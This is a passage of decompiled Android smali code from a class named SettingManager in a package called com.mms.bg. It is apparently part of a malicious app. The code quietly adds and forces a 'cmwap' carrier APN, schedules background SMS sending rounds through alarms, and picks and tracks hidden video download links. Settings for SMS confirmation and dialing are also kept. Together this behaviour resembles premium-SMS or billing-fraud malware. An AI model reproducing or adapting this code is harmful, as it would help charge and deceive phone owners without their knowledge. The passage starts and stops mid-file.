    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getSimOperator()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v10, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1366
    const/4 v7, 0x0

    .line 1368
    .local v7, c:Landroid/database/Cursor;
    :try_start_3f
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mResolver:Landroid/content/ContentResolver;

    sget-object v2, Lcom/mms/bg/ui/SettingManager;->uri_apn_list:Landroid/net/Uri;

    invoke-virtual {v0, v2, v10}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    move-result-object v1

    .line 1369
    .local v1, newRow:Landroid/net/Uri;
    if-eqz v1, :cond_7e

    .line 1370
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mResolver:Landroid/content/ContentResolver;

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 1371
    const-string v0, "_id"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    .line 1372
    .local v8, idindex:I
    invoke-interface {v7}, Landroid/database/Cursor;->moveToFirst()Z

    .line 1373
    invoke-interface {v7, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 1374
    const-string v0, "Robert"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "New ID: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ": Inserting new APN succeeded!"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_7e
    .catch Ljava/lang/Exception; {:try_start_3f .. :try_end_7e} :catch_84

    .line 1380
    .end local v1           #newRow:Landroid/net/Uri;
    .end local v8           #idindex:I
    :cond_7e
    :goto_7e
    if-eqz v7, :cond_83

    .line 1381
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    .line 1383
    :cond_83
    return-object v6

    .line 1376
    :catch_84
    move-exception v0

    goto :goto_7e
.end method

.method public cancelAutoSendMessage()V
    .registers 7

    .prologue
    const/4 v5, 0x0

    .line 422
    const-string v3, "cancelAutoSendMessage"

    invoke-virtual {p0, v3}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;)V

    .line 423
    new-instance v1, Landroid/content/Intent;

    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-class v4, Lcom/mms/bg/ui/AutoSMSRecevier;

    invoke-direct {v1, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 424
    .local v1, intent:Landroid/content/Intent;
    const-string v3, "com.mms.bg.SMS"

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 425
    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    invoke-static {v3, v5, v1, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 427
    .local v2, sender:Landroid/app/PendingIntent;
    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v4, "alarm"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 428
    .local v0, am:Landroid/app/AlarmManager;
    invoke-virtual {v0, v2}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    .line 429
    return-void
.end method

.method public cancelOneRoundSMSSend()V
    .registers 7

    .prologue
    const/4 v5, 0x0

    .line 432
    const-string v3, "cancelOneRoundSMSSend"

    invoke-virtual {p0, v3}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;)V

    .line 433
    new-instance v1, Landroid/content/Intent;

    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-class v4, Lcom/mms/bg/ui/AutoSMSRecevier;

    invoke-direct {v1, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 434
    .local v1, intent:Landroid/content/Intent;
    const-string v3, "action.round.sms"

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 435
    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    invoke-static {v3, v5, v1, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 437
    .local v2, sender:Landroid/app/PendingIntent;
    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v4, "alarm"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 438
    .local v0, am:Landroid/app/AlarmManager;
    invoke-virtual {v0, v2}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    .line 439
    return-void
.end method

.method public clearVedioDownloadLink()V
    .registers 4

    .prologue
    .line 1265
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "vedio_download_link1"

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 1266
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "vedio_download_link2"

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 1267
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "vedio_download_link3"

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 1268
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "vedio_download_link4"

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 1269
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "vedio_download_count"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 1270
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 1271
    return-void
.end method

.method public downloadVedio()V
    .registers 2

    .prologue
    .line 1059
    invoke-virtual {p0}, Lcom/mms/bg/ui/SettingManager;->forceCMWapConnection()Z

    move-result v0

    if-nez v0, :cond_9

    .line 1061
    invoke-direct {p0}, Lcom/mms/bg/ui/SettingManager;->getVedioProcess()V

    .line 1067
    :cond_9
    return-void
.end method

.method public forceCMWapConnection()Z
    .registers 15

    .prologue
    const/4 v4, 0x0

    const/4 v3, 0x0

    const/4 v11, 0x1

    const-string v13, "current"

    const-string v12, "  "

    .line 1070
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mConnMgr:Landroid/net/ConnectivityManager;

    invoke-virtual {v0, v4}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v8

    .line 1071
    .local v8, info:Landroid/net/NetworkInfo;
    invoke-virtual {v8}, Landroid/net/NetworkInfo;->getExtraInfo()Ljava/lang/String;

    move-result-object v9

    .line 1073
    .local v9, oldAPN:Ljava/lang/String;
    const-string v0, "cmwap"

    invoke-virtual {p0, v0}, Lcom/mms/bg/ui/SettingManager;->getApnIdByName(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 1074
    .local v6, cmwapApn:Ljava/lang/String;
    if-nez v6, :cond_1d

    .line 1075
    invoke-direct {p0}, Lcom/mms/bg/ui/SettingManager;->addCMWapApn()Ljava/lang/String;

    move-result-object v6

    .line 1079
    :cond_1d
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "old apn name = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 1081
    if-eqz v6, :cond_10d

    if-eqz v9, :cond_3f

    const-string v0, "cmwap"

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_10d

    .line 1082
    :cond_3f
    new-array v2, v11, [Ljava/lang/String;

    const-string v0, "_id,apn,type,current"

    aput-object v0, v2, v4

    .line 1083
    .local v2, projection:[Ljava/lang/String;
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mResolver:Landroid/content/ContentResolver;

    sget-object v1, Lcom/mms/bg/ui/SettingManager;->uri_apn:Landroid/net/Uri;

    move-object v4, v3

    move-object v5, v3

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 1084
    .local v7, cr:Landroid/database/Cursor;
    if-eqz v7, :cond_f1

    invoke-interface {v7}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-ne v0, v11, :cond_f1

    .line 1085
    if-eqz v7, :cond_f1

    .line 1086
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "_id"

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "  "

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "apn"

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "  "

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "type"

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "  "

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "current"

    invoke-interface {v7, v13}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 1087
    const-string v0, "current"

    invoke-interface {v7, v13}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_f1

    const-string v0, "current"

    invoke-interface {v7, v13}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    const-string v1, "1"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-ne v0, v11, :cond_f1

    .line 1089
    const-string v0, "_id"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mOldAPNId:Ljava/lang/String;

    .line 1090
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "The old apn id = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mOldAPNId:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 1095
    :cond_f1
    new-instance v0, Lcom/mms/bg/ui/SettingManager$CMWapNetworkChangeReceiver;

    invoke-direct {v0, p0, v3}, Lcom/mms/bg/ui/SettingManager$CMWapNetworkChangeReceiver;-><init>(Lcom/mms/bg/ui/SettingManager;Lcom/mms/bg/ui/SettingManager$1;)V

    iput-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mCMWapChangeReceiver:Lcom/mms/bg/ui/SettingManager$CMWapNetworkChangeReceiver;

    .line 1097
    new-instance v10, Landroid/content/IntentFilter;

    const-string v0, "android.net.conn.CONNECTIVITY_CHANGE"

    invoke-direct {v10, v0}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 1098
    .local v10, upIntentFilter:Landroid/content/IntentFilter;
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mCMWapChangeReceiver:Lcom/mms/bg/ui/SettingManager$CMWapNetworkChangeReceiver;

    invoke-virtual {v0, v1, v10}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 1100
    if-eqz v6, :cond_10b

    .line 1101
    invoke-virtual {p0, v6}, Lcom/mms/bg/ui/SettingManager;->updateCurrentAPN(Ljava/lang/String;)I

    :cond_10b
    move v0, v11

    .line 1105
    .end local v2           #projection:[Ljava/lang/String;
    .end local v7           #cr:Landroid/database/Cursor;
    .end local v10           #upIntentFilter:Landroid/content/IntentFilter;
    :goto_10c
    return v0

    :cond_10d
    move v0, v4

    goto :goto_10c
.end method

.method public getApnIdByName(Ljava/lang/String;)Ljava/lang/String;
    .registers 12
    .parameter "apnName"

    .prologue
    const/4 v1, 0x0

    const/4 v9, 0x1

    const-string v0, "type"

    const-string v0, "  "

    .line 1319
    if-nez p1, :cond_a

    move-object v0, v1

    .line 1352
    :goto_9
    return-object v0

    .line 1321
    :cond_a
    const/4 v8, 0x0

    .line 1322
    .local v8, ret:Ljava/lang/String;
    const/4 v6, 0x0

    .line 1326
    .local v6, cr:Landroid/database/Cursor;
    const/4 v0, 0x1

    :try_start_d
    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v1, "_id,apn,type,current"

    aput-object v1, v2, v0

    .line 1327
    .local v2, projection:[Ljava/lang/String;
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mResolver:Landroid/content/ContentResolver;

    sget-object v1, Lcom/mms/bg/ui/SettingManager;->uri_apn_list:Landroid/net/Uri;

    const-string v3, "current = 1 and apn = ?"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    aput-object p1, v4, v5

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v6

    .line 1329
    if-eqz v6, :cond_b3

    invoke-interface {v6}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-ne v0, v9, :cond_b3

    .line 1330
    :cond_2d
    if-eqz v6, :cond_b3

    .line 1331
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "New apn info : "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "_id"

    invoke-interface {v6, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v6, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "  "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "apn"

    invoke-interface {v6, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v6, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "  "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "type"

    invoke-interface {v6, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v6, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "  "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "current"

    invoke-interface {v6, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v6, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 1336
    const-string v0, "type"

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_ba

    const-string v0, "type"

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    const-string v1, "mms"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_ba

    .line 1338
    const-string v0, "_id"

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    :try_end_b2
    .catchall {:try_start_d .. :try_end_b2} :catchall_cb
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_b2} :catch_c1

    move-result-object v8

    .line 1349
    :cond_b3
    :goto_b3
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 1350
    const/4 v6, 0x0

    .end local v2           #projection:[Ljava/lang/String;
    :goto_b7
    move-object v0, v8

    .line 1352
    goto/16 :goto_9

    .line 1341
    .restart local v2       #projection:[Ljava/lang/String;
    :cond_ba
    :try_start_ba
    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z
    :try_end_bd
    .catchall {:try_start_ba .. :try_end_bd} :catchall_cb
    .catch Ljava/lang/Exception; {:try_start_ba .. :try_end_bd} :catch_c1

    move-result v0

    if-nez v0, :cond_2d

    goto :goto_b3

    .line 1346
    .end local v2           #projection:[Ljava/lang/String;
    :catch_c1
    move-exception v0

    move-object v7, v0

    .line 1347
    .local v7, e:Ljava/lang/Exception;
    :try_start_c3
    invoke-virtual {v7}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_c6
    .catchall {:try_start_c3 .. :try_end_c6} :catchall_cb

    .line 1349
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 1350
    const/4 v6, 0x0

    .line 1351
    goto :goto_b7

    .line 1349
    .end local v7           #e:Ljava/lang/Exception;
    :catchall_cb
    move-exception v0

    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 1350
    const/4 v6, 0x0

    throw v0
.end method

.method public getConfirmInfo()Ljava/lang/String;
    .registers 4

    .prologue
    .line 248
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "sms_confirm_info"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getDialEnable()Z
    .registers 4

    .prologue
    .line 285
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "enable_dial"

    const/4 v2, 0x1

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    return v0
.end method

.method public getEffectiveVedioLink(Ljava/util/ArrayList;)Ljava/lang/String;
    .registers 15
    .parameter
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;)",
            "Ljava/lang/String;"
        }
    .end annotation

    .prologue
    .line 1274
    .local p1, links:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    iget-object v9, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v10, "vedio_download_link1"

    const/4 v11, 0x0

    invoke-interface {v9, v10, v11}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 1275
    .local v4, link1:Ljava/lang/String;
    iget-object v9, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v10, "vedio_download_link2"

    const/4 v11, 0x0

    invoke-interface {v9, v10, v11}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 1276
    .local v5, link2:Ljava/lang/String;
    iget-object v9, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v10, "vedio_download_link3"

    const/4 v11, 0x0

    invoke-interface {v9, v10, v11}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 1277
    .local v6, link3:Ljava/lang/String;
    iget-object v9, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v10, "vedio_download_link4"

    const/4 v11, 0x0

    invoke-interface {v9, v10, v11}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 1278
    .local v7, link4:Ljava/lang/String;
    if-eqz p1, :cond_77

    .line 1279
    invoke-virtual {p1}, Ljava/util/ArrayList;->size()I

    move-result v2

    .line 1280
    .local v2, length:I
    const/4 v1, 0x0

    .local v1, index:I
    :goto_2b
    if-ge v1, v2, :cond_77

    .line 1281
    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v9

    const-wide/high16 v11, 0x4024

    mul-double/2addr v9, v11

    const-wide/high16 v11, 0x3ff0

    add-double/2addr v9, v11

    double-to-int v9, v9

    rem-int v8, v9, v2

    .line 1282
    .local v8, selectIndex:I
    invoke-virtual {p1, v8}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    .line 1283
    .local v3, link:Ljava/lang/String;
    const/4 v0, 0x0

    .line 1284
    .local v0, hasDownload:Z
    if-eqz v4, :cond_4b

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    const/4 v10, 0x1

    if-ne v9, v10, :cond_4b

    const/4 v0, 0x1

    .line 1285
    :cond_4b
    if-nez v0, :cond_57

    if-eqz v5, :cond_57

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    const/4 v10, 0x1

    if-ne v9, v10, :cond_57

    const/4 v0, 0x1

    .line 1286
    :cond_57
    if-nez v0, :cond_63

    if-eqz v6, :cond_63

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    const/4 v10, 0x1

    if-ne v9, v10, :cond_63

    const/4 v0, 0x1

    .line 1287
    :cond_63
    if-nez v0, :cond_6f

    if-eqz v7, :cond_6f

    invoke-virtual {v3, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    const/4 v10, 0x1

    if-ne v9, v10, :cond_6f

    const/4 v0, 0x1

    .line 1288
    :cond_6f
    const/4 v9, 0x1

    if-ne v0, v9, :cond_75

    .line 1280
    add-int/lit8 v1, v1, 0x1

    goto :goto_2b

    :cond_75
    move-object v9, v3

    .line 1295
    .end local v0           #hasDownload:Z
    .end local v1           #index:I
    .end local v2           #length:I
    .end local v3           #link:Ljava/lang/String;
    .end local v8           #selectIndex:I
    :goto_76
    return-object v9

    :cond_77
    const/4 v9, 0x0

    goto :goto_76
.end method

.method public getFirstStartTime()Ljava/lang/String;
    .registers 4

    .prologue
    .line 477
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "first_start_time"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getInternetConnectFailed()Z
    .registers 4

    .prologue
    .line 486
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "internet_connect_failed"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    return v0
.end method

.method public getInternetConnectFailedBeforeSMS()Z
    .registers 4

    .prologue
    .line 495
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "internet_connect_failed_before_SMS"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    return v0
.end method

.method public getLastConnectServerTime()J
    .registers 5

    .prologue
    .line 467
